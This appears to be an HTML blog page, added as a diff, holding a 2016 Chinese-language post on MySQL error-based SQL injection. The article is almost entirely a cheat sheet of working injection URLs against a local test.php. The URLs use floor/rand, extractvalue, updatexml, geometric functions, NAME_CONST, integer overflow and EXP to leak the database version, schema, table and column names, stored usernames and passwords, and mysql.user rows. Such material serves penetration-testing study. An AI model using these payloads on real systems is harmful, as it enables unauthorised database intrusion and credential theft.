@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+<meta charset="utf-8" />
+<meta name="author" content="" />
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+<meta name="generator" content="Hugo 0.26" />
+
+<link rel="canonical" href="http://caijiji.github.io/2016/01/03/mysql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
+<base href="http://caijiji.github.io/" />
+<meta property="og:title" content="Mysql 报错注入" />
+<meta property="og:description" content="数据库结构 php源码参考RickGray&rsquo;Blog
+
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://caijiji.github.io/2016/01/03/mysql-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" />
+
+
+
+<meta property="article:published_time" content="2016-01-03T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2016-01-03T00:00:00&#43;00:00"/>
+
+
+
+
+
+
+
+
+
+
+
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Mysql 报错注入"/>
+<meta name="twitter:description" content="数据库结构 php源码参考RickGray&rsquo;Blog
+
+"/>
+
+
+
+<meta itemprop="name" content="Mysql 报错注入">
+<meta itemprop="description" content="数据库结构 php源码参考RickGray&rsquo;Blog
+
+">
+
+
+<meta itemprop="dateModified" content="2016-01-03T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="306">
+
+
+
+<meta itemprop="keywords" content="Hacking," />
+
+
+<link rel="stylesheet" href="css/layout.css" />
+<link rel="stylesheet" href="css/color-dark.css" />
+
+
+
+<title>
+
+
+     Mysql 报错注入 
+
+</title>
+
+<script src="js/highlight.min.js"></script>
+<link rel="stylesheet" href="css/tomorrow-night.min.css" />
+<script>hljs.initHighlightingOnLoad();</script>
+
+</head>
+
+
+<body>
+<div class="main">
+<header>
+
+<div class="header-bar">
+
+  <nav>
+    <div class="siteTitle">
+      <a href="http://caijiji.github.io/">菜狗小陈</a>
+    </div> 
+
+    
+    
+    <a class="nav-item" href="/about/"><div class="nav-item-title">About</div></a>
+    
+    <a class="nav-item" href="/friend/"><div class="nav-item-title">Friend</div></a>
+    
+    <a class="nav-item" href="https://Github.com/Caijiji"><div class="nav-item-title">GitHub</div></a>
+    
+    <a class="nav-item" href="https://twitter.com/Croxy_cn"><div class="nav-item-title">Twitter</div></a>
+    
+
+  </nav>
+</div>
+
+  
+<div class="social-links-header">
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</div>
+
+
+</header>
+
+
+<article class="post">
+    <h1 class="title"> Mysql 报错注入 </h1>
+    <div class="content"> <p>数据库结构 php源码参考<a href="http://rickgray.me/2014/11/16/error-based-sql-injection.html">RickGray&rsquo;Blog</a></p>
+
+<p></p>
+
+<h3 id="1-floor">1 floor()</h3>
+
+<p>Example</p>
+
+<p>Show Version()</p>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=aa'and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&amp;pass=1
+</code></pre>
+
+<p>Show Databases</p>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=aa' AND (SELECT 3904 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)%23&amp;pass=1
+</code></pre>
+
+<p>Show Tables</p>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=aa' AND (SELECT 3210 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x73716c69) LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)%23&amp;pass=1
+</code></pre>
+
+<p>Show columns</p>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=aa' AND (SELECT 8575 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x75736572 AND table_schema=0x73716c69 LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)%23&amp;pass=1
+</code></pre>
+
+<p>Show data</p>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=aa'+and(select 1 from(select count(*),concat((select (select (select concat(0x7,name,0x7e,pass,0x7e) from sqli.`user` limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23&amp;pass=1
+</code></pre>
+
+<h3 id="2-extractvalue">2 Extractvalue()</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=111' and (extractvalue(1,concat(0x7e,(select user()))))%23&amp;pass=1
+
+http://0.0.0.0:8001/test.php?name=111' and (extractvalue(1,concat(0x7e,(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))))%23&amp;pass=1
+
+....
+</code></pre>
+
+<h3 id="3-updatexml">3 updatexml()</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=111' and(updatexml (1,concat(0x7e,(select user()),0x73),1))%23&amp;pass=1
+
+http://0.0.0.0:8001/test.php?name=111' and(updatexml (1,concat(0x7e,((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1)),0x73),1))%23&amp;pass=1
+
+...
+</code></pre>
+
+<h3 id="4-geometrycollection">4 GeometryCollection()</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=111' and GeometryCollection((select * from(select * from(select user())a)b))%23&amp;pass=1
+
+http://0.0.0.0:8001/test.php?name=111' and GeometryCollection((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&amp;pass=1
+</code></pre>
+
+<h3 id="5-polygon">5 polygon()</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=111' and polygon((select * from(select * from(select user())a)b))%23&amp;pass=1
+
+http://0.0.0.0:8001/test.php?name=111' and polygon((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&amp;pass=1
+</code></pre>
+
+<h3 id="6-multipoint">6 multipoint()</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=111' and multipoint((select * from(select * from(select user())a)b))%23&amp;pass=1
+
+http://0.0.0.0:8001/test.php?name=111' and multipoint((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&amp;pass=1
+</code></pre>
+
+<h3 id="7-multilinestring">7 multilinestring()</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=111' and multilinestring((select * from(select * from(select user())a)b))%23&amp;pass=1
+
+http://0.0.0.0:8001/test.php?name=111' and multilinestring((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&amp;pass=1
+</code></pre>
+
+<h3 id="8-multipolygon">8 multipolygon()</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=111' and multipolygon((select * from(select * from(select user())a)b))%23&amp;pass=1
+
+http://0.0.0.0:8001/test.php?name=111' and multipolygon((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&amp;pass=1
+</code></pre>
+
+<h3 id="9-linestring">9 linestring()</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=111' and linestring((select * from(select * from(select user())a)b))%23&amp;pass=1
+
+http://0.0.0.0:8001/test.php?name=111' and linestring((select * from(select * from((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a)b))%23&amp;pass=1
+</code></pre>
+
+<h3 id="10-name-const">10 NAME_CONST()</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=111' and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)%23&amp;pass=1
+</code></pre>
+
+<h3 id="11-整数溢出">11 整数溢出</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=aa' AND (select 1E308*if((select*from(select version())a limit 1)&gt;(select version()),2,2))%23&amp;pass=1
+
+http://0.0.0.0:8001/test.php?name=aa' AND (select 1E308*if((select*from(select*from mysql.user limit 1)a limit 1)&gt;(select*from mysql.user limit 0),2,2))%23&amp;pass=1
+</code></pre>
+
+<h3 id="12-exp">12 EXP()</h3>
+
+<pre><code>http://0.0.0.0:8001/test.php?name=a' and EXP(~(SELECT*FROM(SELECT version())a))%23&amp;pass=1
+
+http://0.0.0.0:8001/test.php?name=a' and EXP(~(SELECT*FROM((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1))a))%23&amp;pass=1
+</code></pre>
+
+<p>From InterNet</p> </div>
+    <footer class="post-footer">
+
+  <div class="post-footer-data">
+    
+<div class="tags">
+    
+      <div class="tag">
+        <a href="/tags/hacking">#Hacking</a>
+      </div>
+    
+</div>
+
+    <div class="date"> Jan 3, 2016 </div>
+  </div>
+
+</footer>
+
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'Croxy';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>
+  Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+</noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+</article>
+
+  <footer>
+
+  <div class="social-links-footer">
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <div class="social-link">
+  <a href="http://caijiji.github.io/index.xml" target="_blank">RSS</a>
+  </div>
+
+</div>
+
+
+  <div class="copyright">  </div>
+
+  <div class="poweredby">
+    Powered by <a href="https://gohugo.io/">Hugo</a>.
+  </div>
+
+  </footer>
+
+</body>
+</html>
+
